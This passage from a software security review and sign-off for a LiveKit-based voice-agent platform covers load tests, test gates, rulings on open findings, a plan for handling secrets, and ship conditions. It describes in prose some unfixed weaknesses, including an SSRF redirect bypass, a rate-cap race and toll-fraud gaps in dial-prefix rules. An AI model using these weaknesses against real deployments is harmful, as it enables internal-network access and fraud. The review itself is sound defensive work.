| B: limits raised to 100k (measures the real work: DB insert and JWT) at 100 rps | 3000 | 100.0 rps | 3.2 / 5.7 / 13.8 ms | 4.2 / 7.8 ms | 200 ×1200, 403 ×900, 404 ×300, 422 ×600 | **0** |
| Headroom: B's limits at 300 rps for 10 s | 3000 | 300.1 rps | 1.8 / 8.7 / 30.4 ms | 4.3 / 15.7 ms | same mix, all expected | **0** |
| Burst: 50 simultaneous connects, `max_concurrent_sessions=5` | 50 | n/a | n/a | n/a | 200 ×14, 429 ×36 | 0 (the 14 is R2-15) |

**Reading the results.**
- Every invalid class got its exact expected code, with no 5xx.
- 429 comes with `rate_limited` (per-IP bucket first, then per-agent) and `agent_busy` (concurrency), each with `retry_after_s` in `details`.
- The per-IP bucket allowed exactly its 6 tokens plus refill.
- p95 stays under 16 ms at three times the target rate.
- Artifacts are in `scratchpad/loadtest/` (`report-*.json`, `load_connect.py`, `race.py`, `run_api.sh`). The scratch api was stopped with SIGINT, and :8121 is free. The user's :8080 (health 200) and :3000 (200) were never load-tested.

**Gates** (after all V2-21 changes; the Python packages ran on the bumped scratch venvs):

| Package | ruff | format | mypy --strict | pytest `-m "not live"` |
|---|---|---|---|---|
| api | clean | clean | clean (124 files) | 959 passed, 1 skipped (the parallel V2-20F work is in the tree) |
| agent | clean | clean | clean (50 files) | 943 passed, 9 skipped |
| web | `pnpm lint`: 0 errors (5 pre-existing warnings) | n/a | `pnpm typecheck` clean | `pnpm test`: 76 files, 1174 passed in `web/`; 1170 passed on the bumped scratch copy, plus a scratch `next build` |

contracts, packs, supervisor and testing: no source changes by V2-21.

## 6. For Fable to rule on

| # | Question | Recommendation |
|---|---|---|
| F-1 | R2-16: one global service token for every workspace | Rule that per-connection worker tokens are needed before multi-organisation tenancy or tenant-hosted workers. Until then, document that the service token is operator-only and must never go to a workspace admin. |
| F-2 | R2-17: a numeric-user `sip:` URI passes by prefix on any host (R-V2-23 text) | Also require the host to be in `allowed_sip_hosts` (or rewrite it to `tel:`). |
| F-3 | R2-18: `+1` admits Caribbean NANP countries; `+1976` doesn't catch NPA-976 | Add a built-in NANP non-US/CA area-code deny list and an `NPA-976-xxxx` rule. Warn in the console when `+1` alone is allowed. |
| F-4 | R2-19: `add_member` binds an unverified email | Make `add_member` an invite for accounts that already belong elsewhere, or add email verification. |
| F-5 | V2-19T-4: `STUCK_DIAL_AFTER_S` 195 vs 210 | Keep the formula (195 s) and correct the ruling text, or set the constant to 210. |
| F-6 | V2-19T-5c: the agent cap on dial answers 429 `calls_busy`, not `agent_busy` | Confirm `calls_busy`, which matches the ruling's error list. V2-21 left it as is. |
| F-7 | Net guard policy: `LKAP_NET_ALLOW_PRIVATE_HOSTS` defaults to loopback in dev and nothing in prod; metadata is always refused | Ratify it as the S1 policy. A prod self-hosted LiveKit on a private network must list its host or CIDR. |
| F-8 | R2-03 role change: binding tool credentials and setting provider endpoint overrides now need `admin` + `providers:write` | Ratify it. V2-20F has already folded the tool editor's credential-picker gating into its RBAC work (`_asks.md` #77). The slot editor's endpoint fields may still need the same gating. |

**Ruled 2026-09-24** (PLAN-V2 §8): F-1 → R-V2-27 (deferred with triggers; interim `/internal/*` CIDR gate), F-2 → R-V2-28 (host must be listed), F-3 → R-V2-29 (`+1` = US/CA; 976 exchange rule), F-4 → R-V2-30 (`add_member` re-add only, else `use_invite`), F-5 → R-V2-31 (195 s), F-6 → R-V2-32 (confirmed `calls_busy`), F-7 → R-V2-26 (ratified; R2-38/R2-39 found), F-8 → R-V2-33 (ratified; slot editor to V2-22). R2-15 → R-V2-34. §7 → R-V2-35. Leftover owners → R-V2-36.

## 7. S2: proposed change to the user's `launch.json` (not applied)

Today the three `lkap-*` entries run `bash -c "export LIVEKIT_API_SECRET=… LKAP_MASTER_KEY=… LKAP_SERVICE_TOKEN=… && exec uv run …"`:
- The secrets sit in `launch.json` in plain text.
- They're in the launcher's `bash` argv until `exec` replaces it.

**Proposal.** Move the values into one user-created file outside the repo. The editor never reads or writes it.

```sh
# ~/.config/lkap/dev.env   (chmod 600; created by the user)
LIVEKIT_URL=…
LIVEKIT_API_KEY=…
LIVEKIT_API_SECRET=…
LKAP_MASTER_KEY=…
LKAP_ADMIN_TOKEN=…
LKAP_SERVICE_TOKEN=…
```

Then each entry sources the file and passes only non-secret values inline, for example `lkap-api`:

```json
{
  "name": "lkap-api",
  "runtimeExecutable": "bash",
  "runtimeArgs": ["-c", "set -a && . \"$HOME/.config/lkap/dev.env\" && set +a && export LKAP_AGENT_NAME=lkap-agent && cd <repo>/livekit_agent_platform/api && exec uv run uvicorn lkap_api.main:app --reload --host 127.0.0.1 --port 8080"],
  "port": 8080
}
```

`lkap-web` sources the same file for `LKAP_ADMIN_TOKEN` and keeps `NEXT_PUBLIC_API_BASE_URL` inline. `lkap-agent` sources it for the LiveKit values and `LKAP_SERVICE_TOKEN`, and keeps `LKAP_API_BASE_URL`, `LKAP_PACKS` and `LKAP_LOG_LEVEL` inline. If the launcher supports an `env` block per configuration, that works just as well. The values then live only in the process environment, which `ps` shows only to the same user and root.

## 8. Architect sign-off (Fable, 2026-09-24)

**Basis.** I read this review, HANDOFF, PLAN-V2 §8, LIVE-RESULTS and the V2-20/V2-21 sections of `_asks.md`, and spot-checked the fixes in code: `net_guard.py`, `_http_safety.py`, `test_security_v2_21.py`, `test_telephony_policy.py`, the cookie check in `auth/deps.py::cookie_allowed`, the console proxy's `crossSiteWrite` and path guard, `slugify` / `by_id_first` / the `_load_version` calls in `routers/agents.py`, `telephony/policy.py`, `limits.py` and the three cap call sites. I ran the guards against IPv6 forms, IPv4-mapped IPv6, decimal, hex, octal and short IPv4 encodings, `0.0.0.0`, NAT64 and 6to4 literals, and names that resolve inward, on both the api and the worker, and I reproduced one redirect bypass (R2-38). No server, migration or git state was touched; the tree is still uncommitted.

**What holds.** The seven HIGH fixes close their holes: the tool dry run and every api outbound client resolve and pin the checked address; the worker's tool clients do the same and never follow redirects; a builder cannot bind a credential or add an endpoint override; an id-shaped name can no longer shadow another workspace's agent (and the version routes query by the loaded row's id); a pending account cannot be claimed from another workspace; httpx logs are quiet; the dependency bumps are in the locks. The cookie CSRF rule is right (cross-site refused, sibling ports refused by `Origin`, header-less server-side calls unaffected), and the proxy refuses cross-site and same-site writes before it adds the break-glass token. The telephony policy is default-deny with the audit rows V2-19T-5a asked for. `calls_busy` is the right code. The load numbers (p95 < 16 ms at 300 rps, no 5xx) are fine for the MVP.

**What does not, yet.** R2-38: aiohttp skips its resolver for IP-literal hosts and the LiveKit client follows redirects, so an admin-set connection URL can bounce the api's Twirp POST onto an internal address (MEDIUM; the JWT does not follow). R2-15: the caps race (14 of 50 admitted at a cap of 5) is real at three call sites. The `+1` prefix admits the Caribbean NANP countries and misses `NPA-976`, and a numeric-user `sip:` URI can name any host. None of these is exploitable by an anonymous caller, and the minute buckets bound the race, so no HIGH is open; but none should reach a customer-facing deployment, and two of them touch toll fraud.

### Verdict

| Use | Verdict |
|---|---|
| **Local development and the MVP** (one operator, operator-run workers, SQLite or Postgres, one api process on SQLite) | **SHIP-WITH-CONDITIONS** |
| **Multi-tenant production** (more than one organisation, or tenant-hosted workers, or an internet-facing `/internal/*`) | **NO-SHIP** until the conditions below are met |

### Conditions for local and MVP use

1. **V2-22 lands green** (PLAN-V2 §4), in particular R2-38 (aiohttp literal check and redirects off), R-V2-34 (the cap reservation at all three call sites), R-V2-28 and R-V2-29 (the `sip:` host rule and the `+1` rule), R-V2-30 (`add_member` narrowing), R2-20 (one `recording.ready`), and the `/internal/*` CIDR gate for the prod compose. Nothing in it is large; all of it is bounded by the acceptance lines in the rulings.
2. **The tree is committed and the running processes catch up.** Gates ran on scratch venvs (§5): before the commit the coordinator runs `uv sync` in `api/` and `agent/` and the four Python gates on the real venvs; the user runs `pnpm install` in `web/` and restarts `lkap-web`; the user's `lkap-agent` worker is restarted (SIGINT, wait 15 s) so it runs the guard, pillow 12 and the V2-20 B2 fix; the coordinator applies `v2_011_recording_error` to `api/data/lkap.db` after a `.backup`. One commit per HANDOFF's rule.
3. **The user applies §7** (secrets out of `launch.json` argv into a 0600 env file). The repo side of S2 is done; this is the only piece the repo cannot do.
4. **No outbound dialing on a real trunk until V2-22 has landed and L12b has run** with `allowed_prefixes` set per workspace (R-V2-23) and the `+1` semantics of R-V2-29 in place. Inbound and console-side telephony are fine to exercise before that.
5. **Operational rules recorded in RUNBOOK by V2-22 and followed:** one api process on SQLite; `LKAP_ENV=prod` for anything not on a developer's machine (the dev allowlist is loopback only and prod refuses weak secrets); a private self-hosted LiveKit must be listed in `LKAP_NET_ALLOW_PRIVATE_HOSTS`; the service token is operator-only.

### Conditions for multi-tenant production (all of them)

1. **Per-connection worker tokens** (R-V2-27) once any trigger applies, and `/internal/*` reachable only from worker networks or the operator's listed CIDRs.
2. **Email verification, or an equivalent proof of address ownership, for accounts** (residual of R2-19 / R-V2-30), and the invite token off the query string (R2-27).
3. **Supply-chain pins by digest** (R2-21: actions by SHA with Dependabot, images by `@sha256:`, flavour requirements with `--require-hashes`), which needs the GitHub remote the user has not created.
4. **Postgres and Redis in front of `api ×2`, verified:** the `RedisRateLimiter` is what makes the connect, login and call buckets hold across replicas; the webhook replay cache (R2-12) is per process, acceptable only because the handlers are idempotent, so the two-replica case is run once (L11) before scaling; the `FOR UPDATE` half of R-V2-34 proven on the Postgres CI job.
5. **The remaining LOW hygiene closed or accepted in writing:** R2-25 (local signed-URL scope, before any route serves them), R2-28 (number ownership), R2-29 and R2-31 (enumeration), R2-30 (API-key lifetime and creator), R2-33 (upstream error text), R2-35 (vitest 4).
6. **Live stages that never ran, run at least once on the target infrastructure:** L11 (prod compose), L14 (self-hosted connection), L9 with S3-compatible storage, and L12b.
7. **An egress-proxy policy, if the operator needs one** (R2-22: guarded clients go direct; a proxy must enforce the private-range rule itself).

### Not conditions, but noted

- Ask #76 (`call.started` / `call.ended` webhook events) is a feature gap, not a security one; the coordinator routes it separately (R-V2-36).
- `SeenEvents` (R2-12) and the in-memory limiter are correct for one process; the prod compose already provides Redis.
- The `lk agent list` and DB checks in LIVE-RESULTS §6 satisfy me that V2-20 left the user's stack untouched; V2-21 load-tested only a scratch api on :8121.

## 9. Files changed by V2-21

**api**
- New:
  - `net_guard.py`
  - `tests/test_security_v2_21.py`
  - `tests/test_telephony_policy.py`
- Edited:
  - `settings.py` (`net_allow_private_hosts`)
  - `deps.py`
  - `jobs/service.py`
  - `connections/{clients,probe,service}.py`
  - `routers/{tools,webhooks,agents,workspaces,auth,calls,hooks}.py`
  - `auth/{deps,invites}.py`
  - `qa/resolve.py`
  - `logging.py`
  - `keys.py`
  - `bootstrap.py`
  - `tests/test_connections_webhooks.py`
  - `tests/test_vault.py`
  - `pyproject.toml` and `uv.lock` (cryptography)

**agent**
- `tools/_http_safety.py`
- `tools/declarative.py`
- `tools/builtin/http_request.py`
- `logging.py`
- `tests/unit/test_http_safety.py`
- `tests/unit/test_telephony.py`
- `pyproject.toml` and `uv.lock` (pillow)

**web**
- `src/app/api/console/[...path]/route.ts`
- `src/panels/blocks/pdf-page.tsx`
- `tests/console-proxy-auth.test.ts`
- `package.json` and `pnpm-lock.yaml`

**Repo**
- `.github/workflows/*.yml` (permissions; `live.yml` input)
- `scripts/smoke_v2.sh`
- `docs/RUNBOOK.md` (rotate)
- `docs/v2/_asks.md` (V2-21 section)
- this file
